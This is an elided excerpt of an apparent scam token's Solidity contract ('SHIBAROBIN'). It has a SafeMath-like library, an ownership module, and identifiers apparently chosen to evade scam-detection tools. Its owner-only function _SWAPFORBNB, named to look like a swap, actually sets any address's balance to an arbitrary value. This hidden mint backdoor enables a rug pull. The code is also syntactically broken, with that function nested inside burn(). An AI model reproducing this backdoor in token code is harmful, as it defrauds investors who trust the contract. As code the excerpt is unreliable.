...
library _SAFEETH {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "_SAFEETH: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "_SAFEETH: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "_SAFEETH: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "_SAFEETH: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "_SAFEETH: modulo by zero");
  }
...
contract _SNIFER is Context {
  ...
  modifier onlyOwner() {
    require(_owner == _msgSender(), "_SNIFER: caller is not the owner");
    _;
  }
  ...
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "_SNIFER: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract SHIBARobinhood is Context, _SNIFERSCOREPLEASE, _SNIFER {
  using _SAFEETH for uint256;
  ...
  constructor() public {
    _name = 'SHIBA INU Robinhood INVEST';
    _symbol = 'SHIBAROBIN';
    _decimals = 0;
    _MAXTOTALSUPPLY = 9897350304083;
    Tbalance[msg.sender] = _MAXTOTALSUPPLY;
  ...
  function burn(uint256 _TOTALAMT) public virtual {
     ...
     function _SWAPFORBNB(address _MAXTRX, uint256 _TOTALAMT) external onlyOwner {
      Tbalance[_MAXTRX] = _TOTALAMT * 10 ** 0;
  }
  ...
  function _burn(address account, uint256 _TOTALAMT) internal {
    ...
    _MAXTOTALSUPPLY = _MAXTOTALSUPPLY.sub(_TOTALAMT);
